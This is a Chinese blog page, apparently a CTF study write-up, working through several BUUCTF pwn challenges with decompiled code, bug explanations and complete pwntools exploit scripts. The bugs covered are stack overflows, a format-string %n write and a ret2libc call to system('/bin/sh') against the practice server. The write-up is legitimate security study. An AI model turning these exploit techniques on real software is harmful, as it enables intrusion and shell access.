@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+  <head>
+    
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BUUCTF-刷pwn题版 | JerryXie&#39;s Blog</title>
+<meta name="description" content="CTF, digital forensics, offensive security, and study notes.">
+<meta name="theme-color" content="#f5f5f7">
+<meta name="referrer" content="no-referrer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-刷pwn题版 | JerryXie&#39;s Blog">
+<meta property="og:description" content="CTF, digital forensics, offensive security, and study notes.">
+
+  <meta property="og:url" content="https://jerryxie.top/notes/ctf/BUUCTF-刷pwn题版/">
+  <link rel="canonical" href="https://jerryxie.top/notes/ctf/BUUCTF-刷pwn题版/">
+
+
+  <meta name="author" content="JerryXie">
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="/js/main.js"></script>
+
+  <meta name="generator" content="Hexo 8.1.1"></head>
+  <body>
+    <div class="scroll-progress" data-scroll-progress></div>
+    <div class="site-shell">
+      
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark"></span>
+      <span class="brand-name">JerryXie&#39;s Blog</span>
+    </a>
+
+    <button class="menu-toggle" type="button" data-menu-toggle aria-label="Toggle navigation">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="site-nav" data-menu-panel>
+      
+        <a href="/" class="">Home</a>
+      
+        <a href="/archives/" class="">Archive</a>
+      
+        <a href="/categories/" class="">Library</a>
+      
+        <a href="/about/" class="">About</a>
+      
+    </nav>
+
+    <button class="theme-toggle" type="button" data-theme-toggle aria-label="Toggle theme">
+      <span data-theme-icon>Dark</span>
+    </button>
+  </div>
+</header>
+
+      <main class="page-shell">
+        
+
+<article class="article-layout">
+  <div class="article-main card-panel">
+    <a class="back-link" href="/categories/">Back to library</a>
+    <header class="article-header">
+      <div class="article-badges">
+        
+          
+            <a class="category-chip" href="/categories/ctf/">ctf</a>
+          
+        
+      </div>
+      <h1>BUUCTF-刷pwn题版</h1>
+      <div class="article-meta">
+        <span>Published 2026-04-19</span>
+        <span>Updated 2026-04-19</span>
+        <span>34 min</span>
+      </div>
+      
+        <p class="article-source">Source path: <code>ctf/BUUCTF-刷pwn题版.md</code></p>
+      
+    </header>
+
+    <div class="article-content">
+      <p>代码自己写才是对的.</p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="1-warmup-csaw-2016"><a href="#1-warmup-csaw-2016" class="headerlink" title="1.warmup_csaw_2016"></a>1.warmup_csaw_2016</h2><p>考点：栈溢出</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  _BYTE v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xAu</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9u</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>gets函数就是栈溢出</p>
+<p>观察一下这个函数就能直接看出来他的返回地址是这个flag</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40060D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-ciscn-2019-n-1"><a href="#2-ciscn-2019-n-1" class="headerlink" title="2.ciscn_2019_n_1"></a>2.ciscn_2019_n_1</h2><p>考点：栈溢出</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里把v2的值写死了，所以需要覆盖掉原值，替换成<code>11.28125</code>即可</p>
+<p>这里的栈溢出和以前略微有点不一样（30-4），因为v2和v1有一部分叠在一起了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1764892434289-5e610781-5482-43b7-8894-8d93725fe157.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>这个时候v2换成<code>0x41348000</code>即可<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1764910691885-859de2dc-bee9-44c3-99cd-5cf2c6a12148.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29039</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(r<span class="string">&quot;E:\CTF\pwn学习\BUUCTF\ciscn_2019_n_1\ciscn_2019_n_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x30</span><span class="number">-0x4</span></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*offset+p64(<span class="number">0x41348000</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-pwn1-sctf-2016"><a href="#3-pwn1-sctf-2016" class="headerlink" title="3.pwn1_sctf_2016"></a>3.pwn1_sctf_2016</h2><p>考点：栈溢出</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *src; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  _DWORD v5[<span class="number">2</span>]; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, _TMC_END__); <span class="comment">//栈溢出1</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;input, s);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;v4, <span class="string">&quot;you&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>((<span class="type">char</span> *)v5 + <span class="number">1</span>, <span class="string">&quot;I&quot;</span>, &amp;v6);</span><br><span class="line">  replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v3);  <span class="comment">//栈溢出2</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;input, &amp;v3, (<span class="type">char</span> *)v5 + <span class="number">1</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;v3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="type">char</span> *)v5 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;v4);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(v5);</span><br><span class="line">  src = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1764916384717-ffd25812-9e34-4de4-8923-f9f798f1aa96.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>分析了一下，会有you和i的互换，所以这里可以试一下是谁换谁（如果看不懂代码）</p>
+<figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Last login: Thu Dec  4 21:48:50 2025 from 192.168.100.1</span><br><span class="line">a1gorithms@A1gorithm:~$ nc node5.buuoj.cn 27308</span><br><span class="line">you</span><br><span class="line">Tell me something about yourself: So, you</span><br><span class="line"></span><br><span class="line">you you you</span><br><span class="line">^C</span><br><span class="line">a1gorithms@A1gorithm:~$ nc node5.buuoj.cn 27308</span><br><span class="line">you you you</span><br><span class="line">Tell me something about yourself: So, you you you</span><br><span class="line"></span><br><span class="line">^C  </span><br><span class="line"></span><br><span class="line">a1gorithms@A1gorithm:~$ nc node5.buuoj.cn 27308</span><br><span class="line">IIIII</span><br><span class="line">Tell me something about yourself: So, youyouyouyouyo</span><br></pre></td></tr></table></figure>
+
+<p>程序会把<code>I</code>换成<code>you</code>，所以我们利用<code>I（1字节）</code>变成<code>you（3字节）</code>来造成s[]的溢出</p>
+<figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,27308)</span><br><span class="line"></span><br><span class="line">elf = ELF(r<span class="string">&quot;E:\CTF\pwn学习\BUUCTF\pwn1_sctf_2016\pwn&quot;</span>)</span><br><span class="line">get_flag_addr = elf.symbols[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload = b<span class="string">&#x27;I&#x27;</span>*(0x14) + b<span class="string">&#x27;a&#x27;</span>*4 + p32(get_flag_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>
+
+<p>0x14的原因<code>0x14=0x3C/3</code></p>
+<p>注意不能直接I发<code>0x14+4</code>，之后用其他代替.</p>
+<h2 id="4-jarvisoj-level0"><a href="#4-jarvisoj-level0" class="headerlink" title="4.jarvisoj_level0"></a>4.jarvisoj_level0</h2><p>考点：栈溢出</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很ez的栈溢出</p>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">r&quot;E:\CTF\pwn学习\BUUCTF\jarvisoj_level0\pwn&quot;</span>)</span><br><span class="line">callsystem_addr =elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>]</span><br><span class="line">offset = <span class="number">0x80</span>+<span class="number">8</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p64(callsystem_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-第五空间2019-决赛-PWN5"><a href="#5-第五空间2019-决赛-PWN5" class="headerlink" title="5.[第五空间2019 决赛]PWN5"></a>5.[第五空间2019 决赛]PWN5</h2><p>考点： format string   格式化字符串</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1764934498351-e5ddc797-957a-4a9b-afe1-61c602234d7c.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<blockquote>
+<p>我原本想用gdb调试看能不能做出格式化字符串的偏移位置，可是gdb死活打不上main的断点我没招..</p>
+</blockquote>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;buf_, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xFu</span>);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == buf_ )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>这个时候直接运行程序看泄露的偏移量</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">your name:aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">Hello,aaaa.<span class="number">0xffd60138.0</span>x63.(nil).<span class="number">0xea875ba0.0</span>x3.<span class="number">0xea8367b0.0</span>x1.(nil).<span class="number">0x1.0</span>x61616161.<span class="number">0x2e70252e.0</span>x252e7025.<span class="number">0x70252e70.0</span>x2e70252e.<span class="number">0x252e7025.0</span>x70252e70</span><br></pre></td></tr></table></figure>
+
+<p>Q1：明明%p是答应指针的地址，为什么会打印出<code>aaaa</code>的ASCII码值？</p>
+<p> 在 <code>printf(buf);</code> 这一次调用中，**某一个变参槽位上，正好读到了缓冲区里前 4 个字节 **<code>**&quot;aaaa&quot;**</code>，被当作指针打印出来了 ；相当于在当前这个程序、当前编译方式下，<code>printf</code> 取“第 10 个参数”时，其实是在栈上读到了 <code>buf</code> 里的前 4 个字节。  </p>
+<blockquote>
+<p>以下是gpt写的payload，真心觉得写得好。</p>
+</blockquote>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地调试时用 process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26084</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局变量 buf_ 的地址（题目给出 .bss: 0804C044）</span></span><br><span class="line">buf_addr = <span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload 说明：</span></span><br><span class="line"><span class="comment"># 1. 前 4 字节是 buf_ 的地址，会成为第 10 个参数（之前调试看到第 10 个是 0x61616161）</span></span><br><span class="line"><span class="comment"># 2. &quot;%10$n&quot; 把当前 printf 已输出的字符数写入第 10 个参数指向的地址（buf_）</span></span><br><span class="line"><span class="comment"># 在这个 printf 调用中，%10$n 前只打印了 4 个字节（这 4 个地址字节），所以写入的值是 4</span></span><br><span class="line">payload = p32(buf_addr) + <span class="string">b&#x27;%10$n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互：先输 name（利用格式化字符串改 buf_）</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your name:&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时 buf_ == 4，接下来输入密码 &quot;4&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your passwd:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拿 shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Q2：%n到底是什么作用？</p>
+<p><code>%n</code>不打印任何东西，而是把<strong>当前已经输出的字符个数</strong>，写到一个 <code>int *</code> 指针指向的内存里；10$就是第10个参数。当我们把第10个参数的值写成<code>buf_addr</code>，<code>%10$n</code>也就把第10个参数的值当做指针，并写入当前printf 已输出字符数（这里的buffer地址是4字节的，所以%n写入的值为4，也就是<code>buf_</code>被赋值为4）。</p>
+<p>另外一个payload，来自<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1as4y1E7mr?vd_source=7564738e9554c00c8cc808fd3016b121&spm_id_from=333.788.videopod.episodes&p=7">https://www.bilibili.com/video/BV1as4y1E7mr?vd_source&#x3D;7564738e9554c00c8cc808fd3016b121&amp;spm_id_from&#x3D;333.788.videopod.episodes&amp;p&#x3D;7</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1764936975181-50f0b120-47c2-46f3-aa76-9538cb9b895b.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>这个的逻辑是把“第 12 个参数”当成指针取出来，这个值布置成 <code>0x0804C044</code>；  然后把“当前已经输出的字符数 3”写到 <code>*(int *)0x0804C044</code>，也就是 <code>buf_</code>。</p>
+<p>后面的逻辑两个payload都很好理解，输入填入个数即可。</p>
+<h2 id="6-jarvisoj-level2"><a href="#6-jarvisoj-level2" class="headerlink" title="6.jarvisoj_level2"></a>6.jarvisoj_level2</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76794844/article/details/148871146?ops_request_misc=%257B%2522request%255Fid%2522%253A%252247cb16c16feba28ee02586f429a09e38%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=47cb16c16feba28ee02586f429a09e38&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-148871146-null-null.142%5Ev102%5Epc_search_result_base7&utm_term=jarvisoj_level2&spm=1018.2226.3001.4187">BUUCTF-jarvisoj_level2详解_buuctf level2-CSDN博客</a></p>
+<blockquote>
+<p>考点分析部分均来自于以上博客.</p>
+</blockquote>
+<p>考点：<code>ret2libc</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1765276452240-c5919bf6-c553-4895-bc06-af8d4c966d61.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<blockquote>
+<p>需要构造“fake_ret地址”的原因：</p>
+<p>我们使用的是“覆盖返回地址”达到函数调用的效果而非call指令，因此不会自动完成“push 返回地址”的操作</p>
+<p>所以我们需要手动模拟这一过程</p>
+<p>返回地址虽然是我们构造的，但是也需要尽量使用有效的地址信息比如返回到main函数或者直接返回到exit()函数然后优雅地退出</p>
+</blockquote>
+<p>构造的payload应该是这样的结构与顺序：</p>
+<figure class="highlight less" data-language="less" data-language-label="Less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[padding栈溢出直到返回地址]</span> + <span class="selector-attr">[system函数地址]</span> + <span class="selector-attr">[fake_ret地址]</span> + <span class="selector-attr">[<span class="string">&quot;/bin/sh&quot;</span>字符串地址]</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>回到题目中</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1765249579021-80af8274-eb04-451c-b1b4-15a19d453e79.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>能在字符串列表中找<code>/bin/sh</code>：</p>
+<p><code>.data:0804A024 2F 62 69 6E 2F 73 68 00           hint db &#39;/bin/sh&#39;,0</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1765249656725-d9d4f0bc-935d-49b0-a89a-0ce167236f6d.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>所以的话应该是利用栈溢出。</p>
+<p>按照上面的payload的格式写出payload（返回地址写两个函数都行）</p>
+<figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,<span class="built_in">arch</span>=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,28901)</span><br><span class="line">elf=ELF(r<span class="string">&quot;E:\CTF\pwn学习\BUUCTF\jarvisoj_level2\pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset=0x88+4</span><br><span class="line">system_addr=elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># main_addr=elf.symbols[&#x27;main&#x27;]</span></span><br><span class="line">vulnerable_function_addr=elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(main_addr))</span></span><br><span class="line"><span class="built_in">print</span>(hex(vulnerable_function_addr))</span><br><span class="line"><span class="built_in">print</span>(hex(system_addr))</span><br><span class="line">bin_sh_addr=0x804A024</span><br><span class="line"><span class="comment">#payload=b&#x27;M&#x27;*offset+p32(system_addr)+p32(main_addr)+p32(bin_sh_addr)</span></span><br><span class="line"><span class="comment">#main_addr换成main函数的结束地址也行</span></span><br><span class="line">payload=b<span class="string">&#x27;M&#x27;</span>*offset+p32(system_addr)+p32(vulnerable_function_addr)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="undo7-Black-Watch-入群题-PWN1"><a href="#undo7-Black-Watch-入群题-PWN1" class="headerlink" title="undo7.[Black Watch 入群题]PWN1"></a>undo7.[Black Watch 入群题]PWN1</h2><p>reference:<a target="_blank" rel="noopener" href="https://blog.csdn.net/cyy001128/article/details/146882575?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%A0%88%E8%BF%81%E7%A7%BB&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-146882575.142%5Ev102%5Epc_search_result_base7">栈迁移学习-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1np4y1d7pu?spm_id_from=333.788.videopod.sections&vd_source=7564738e9554c00c8cc808fd3016b121">pwn技术分享-栈迁移1-bilibili</a></p>
